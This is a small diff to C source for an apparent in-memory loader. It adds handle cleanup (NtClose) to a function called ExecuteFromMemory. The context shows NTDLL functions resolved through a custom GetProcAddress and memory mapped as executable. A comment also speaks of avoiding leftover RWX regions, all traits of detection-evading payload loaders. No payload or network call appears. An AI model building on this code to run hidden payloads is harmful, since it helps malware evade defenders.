@@ -11,6 +11,7 @@ STRINGA(ntfreevirtualmemory, "NtFreeVirtualMemory");
 STRINGA(ntcreatesection, "NtCreateSection");
 STRINGA(ntmapviewofsection, "NtMapViewOfSection");
 STRINGA(ntunmapviewofsection, "NtUnmapViewOfSection");
+STRINGA(ntclose, "NtClose");
 
 // -------------------- NTDLL typedefs --------------------
 typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
@@ -19,6 +20,7 @@ typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
 typedef NTSTATUS(NTAPI* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
 typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
+typedef NTSTATUS(NTAPI *NtClose_t)(HANDLE);
 
 typedef enum _SECTION_INHERIT {
     ViewShare = 1,
@@ -173,6 +175,10 @@ static void ExecuteFromMemory(unsigned char* data) {
     base = NULL;
     viewSize = 0;
     NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
+
+    // Close section handle
+    NtClose_t NtClose = (NtClose_t)myGetProcAddress(ntdll, ntclose);
+    NtClose(hSection);
 
     // Pre-mark entire module as WC to avoid leftover RWX padding
     ULONG oldProtect;
